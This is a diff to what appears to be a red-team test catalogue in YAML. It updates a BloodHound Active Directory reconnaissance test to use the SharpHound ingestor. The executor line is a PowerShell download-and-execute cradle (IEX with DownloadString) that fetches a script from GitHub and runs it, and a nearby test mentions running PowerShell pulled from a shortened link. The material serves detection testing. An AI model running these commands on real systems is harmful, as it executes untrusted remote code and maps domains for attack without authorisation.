@@ -15471,11 +15471,11 @@ execution:
         bloodurl:
           description: BloodHound URL
           type: url
-          default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1
+          default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1
       executor:
         name: command_prompt
         command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{bloodurl}'');
-          Get-BloodHoundData"
+          Invoke-BloodHound"
 
 '
     - name: Obfuscation Tests
@@ -15484,11 +15484,6 @@ execution:
         Reaches out to bit.ly/L3g1t to stdout: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
       supported_platforms:
       - windows
-      input_arguments:
-        bloodurl:
-          description: BloodHound URL
-          type: url
-          default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1
       executor:
         name: powershell
         command: |
